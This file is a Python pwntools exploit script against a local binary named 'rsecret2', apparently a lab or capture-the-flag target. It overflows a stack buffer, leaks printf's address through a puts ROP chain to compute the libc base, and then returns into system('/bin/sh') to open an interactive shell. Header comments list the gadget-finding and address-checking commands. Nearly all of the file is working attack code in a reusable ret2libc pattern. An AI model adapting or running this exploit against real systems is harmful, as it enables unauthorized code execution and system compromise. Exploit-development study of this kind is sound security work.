#!/usr/bin/python3

# ldd {vuln} -> /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dcb000)
# ps -aux | grep {vuln}
# cat /proc/{pid}/maps
# libc base address: 0x00007ffff7dcb000
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret" -> 0x0000000000027c65
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "/bin/sh" -> 0x000000000019604f
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts -> 0x0000000000075b00

# check address:
# xxd -l 8 /lib/x86_64-linux-gnu/libc.so.6
# (gdb) x/2x 0x7ffff7dcb000
# (gdb) x/x 0x7ffff7df2c65 -> 0x0f66c35f
# (gdb) x/x 0x7ffff7f6104f -> 0x6e69622f
# (gdb) x/x 0x7ffff7f61053 -> 0x0068732f
# (gdb) x/x 0x7ffff7e40b00

from pwn import *
from pprint import pprint

test_stage = 1
exploit_stage = 2

target = ["./rsecret2"]
offset = 56

context.arch = "amd64"
context.update(os = "linux")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

elf = ELF(target[0])
pprint(elf.symbols)

rop = ROP(elf)

rop_libc = ROP(libc)

BIN_SH_LIBC = next(libc.search(b"/bin/sh\x00"))
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
POP_RDI_LIBC = rop_libc.find_gadget(["pop rdi", "ret"])[0]
PRINTF_GOT = elf.got["printf"]
PUTS_PLT = elf.plt["puts"]
SYSTEM_LIBC = libc.symbols["system"]

print("-" * 100)
print("/bin/sh string@libc offset: " + hex(BIN_SH_LIBC))
print("pop rdi gadget offset: " + hex(POP_RDI))
print("pop rdi gadget@libc offset: " + hex(POP_RDI_LIBC))
print("printf@got: " + hex(PRINTF_GOT))
print("puts@plt: " + hex(PUTS_PLT))
print("system@libc offset: " + hex(SYSTEM_LIBC))
print("-" * 100)

# global variables to be calculated by address leak
global libc_base
global bin_sh
global pop_rdi
global system_libc

p = process(target)
gdb.attach(p, gdbscript = "continue")

def main():
    test()
    exploit()

def test():
    rop_leak = p64(POP_RDI) + p64(PRINTF_GOT) + p64(PUTS_PLT)
    rop.call(elf.symbols["main"])
    test = [
        b"A" * offset,
        rop_leak,
        rop.chain()
    ]
    payload = b"".join(test)
    inject(payload, test_stage)

def exploit(leak=True):
    if leak:
        rop_leak = p64(POP_RDI) + p64(bin_sh) + p64(PUTS_PLT)
        rop_exec = p64(pop_rdi) + p64(bin_sh) + p64(system_libc)
        exploit = [
            b"A" * offset,
            rop_leak,
            rop_exec 
        ]
    else:
        rop_exec = p64(pop_rdi+1) + p64(pop_rdi) + p64(bin_sh) + p64(system_libc)
        exploit = [
            b"A" * offset,
            rop_exec
        ]
    payload = b"".join(exploit)
    inject(payload, exploit_stage)

def inject(payload, stage):
    global libc_base
    global bin_sh
    global pop_rdi
    global system_libc

    p.recvuntil("\n")
    p.sendline(payload)
    if stage == test_stage:
        p.recvuntil("key")
        received = p.recvline().rstrip()
        leaked = u64(received.ljust(8, b"\x00"))
        libc_base = leaked - libc.symbols["printf"]
        bin_sh = libc_base + BIN_SH_LIBC
        pop_rdi = libc_base + POP_RDI_LIBC
        system_libc = libc_base + SYSTEM_LIBC
        print("-" * 100)
        print("leaked address: " + hex(leaked))
        print("calculated libc base address: " + hex(libc_base))
        print("calculated system call address: " + hex(system_libc))
        print("-" * 100)
    if stage == exploit_stage:
        p.recvuntil("\n")
        p.interactive()

if __name__ == "__main__":
    main()
